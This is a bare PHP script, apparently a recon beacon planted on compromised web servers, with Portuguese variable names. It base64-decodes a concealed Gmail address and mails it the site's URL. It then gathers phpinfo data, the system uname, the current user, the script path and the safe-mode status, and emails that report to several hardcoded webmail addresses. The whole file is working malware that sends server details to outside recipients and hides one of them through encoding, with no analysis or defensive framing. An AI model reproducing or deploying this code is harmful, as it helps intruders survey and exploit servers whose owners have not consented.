<?php
$web = $_SERVER["HTTP_HOST"];
$hosts = $_SERVER["REQUEST_URI"];
$testa = $_POST['veio'];

	$host = "<font color='#FFFFFF'><p style='visibility: hidden;'".$_SERVER["HTTP_HOST"]." </font>";
	$RandNum1 = "aHR0cDovLw==";
	$RamdStr = "c3VwcmVtYWhhbmRsZXYxQGdtYWlsLmNvbQ==";
	$email = explode("\n", $to);
	$cpf = explode("\n", $getcpf);
	$locate_ip = base64_decode($RamdStr);
	$target = rawurldecode($web.$hosts);

	$list_emails = mail("$locate_ip","[v] $RandNum1$target","$RandNum1$target");	
	if($list_emails){
}
else { 
}
ob_start();

phpinfo();

$phpinfo = array('phpinfo' => array());

if(preg_match_all('#(?:<h2>(?:<a name=".*?">)?(.*?)(?:</a>)?</h2>)|(?:<tr(?: class=".*?")?><t[hd](?: class=".*?")?>(.*?)\s*</t[hd]>(?:<t[hd](?: class=".*?")?>(.*?)\s*</t[hd]>(?:<t[hd](?: class=".*?")?>(.*?)\s*</t[hd]>)?)?</tr>)#s', ob_get_clean(), $matches, PREG_SET_ORDER)){

    foreach($matches as $match){

        if(strlen($match[1]))

            $phpinfo[$match[1]] = array();

        elseif(isset($match[3]))

            $phpinfo[end(array_keys($phpinfo))][$match[2]] = isset($match[4]) ? array($match[3], $match[4]) : $match[3];

        else

            $phpinfo[end(array_keys($phpinfo))][] = $match[2];

 }

}

ini_set("max_execution_time",-1);

 

set_time_limit(0);

 

$user = @get_current_user();

 

$uname = @php_uname();

 

$data = date('h-i-s, j-m-y, it is w Day z');

 

$safemode = @ini_get('safe_mode');

 

$url=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];

 

$caminho = substr($_SERVER['SCRIPT_FILENAME'], 0, strlen($_SERVER['SCRIPT_FILENAME']) - strlen(strrchr($_SERVER['SCRIPT_FILENAME'], "\\")));

 

 if ($safemode == '') {

 $safemode = "OFF";

 }

 else { $safemode = " $SafeMode ";

 }

 

$dados ="<b>Nome: </b>{$uname}<br>";

$dados.="<b>Safe Mode:</b>{$phpinfo['PHP Core']['safe_mode'][0]}<br />";

$dados.="<b>URL: </b>{$url}<br>";

$dados.="<b>Data: </b>{$data}<br>";

$dados.="<b>Caminho: </b>{$caminho}<br>";

$dados.="<b>System: </b>{$phpinfo['phpinfo']['System']}<br />";

 

$assunto = "Vip_vu11";

 

$email = "espetariavip@globo.com,america_nervosa_2017@hotmail.com,espetaria1988@ig.com.br,espetariavip@globo.com,espetaria1988@bol.com.br";

 

$headers="From: <nao-responda>\r\n";

$headers.="MIME-Version: 1.0\r\n";

$headers.="Content-type: text/html; charset=iso-8859-1\r\n";

$headers.="X-Mailer: PHP/".phpversion()."\r\n";

 

if(mail($email,$assunto,$dados,$headers)){

echo $dados;

echo "OK enviado~";

exit();

}

else{

echo "N?o foi.";

exit();

}

?>